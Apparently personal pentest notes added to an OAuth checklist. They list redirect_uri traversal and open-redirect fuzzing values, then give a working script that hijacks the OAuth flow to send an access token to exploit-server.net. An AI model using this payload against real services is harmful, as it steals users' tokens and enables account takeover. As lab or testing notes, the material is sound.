@@ -101,3 +101,44 @@ state parameter protection
 Authorization code reuse
 Token leakage
 Account linking / social login issues
+
+
+
+
+----
+1️⃣ redirect_uri
+../
+%2e%2e%2f
+;
+?
+#
+
+2️⃣ open redirect
+path
+next
+return
+continue
+redirect
+
+3️⃣ response_type
+token
+code
+id_token
+
+4️⃣ response_mode
+fragment
+query
+form_post
+
+5️⃣ state
+validate
+
+
+--------
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://server.net/auth?client_id=CLIENT-ID&redirect_uri=https://server.net/oauth-callback/../post/next?path=https://exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
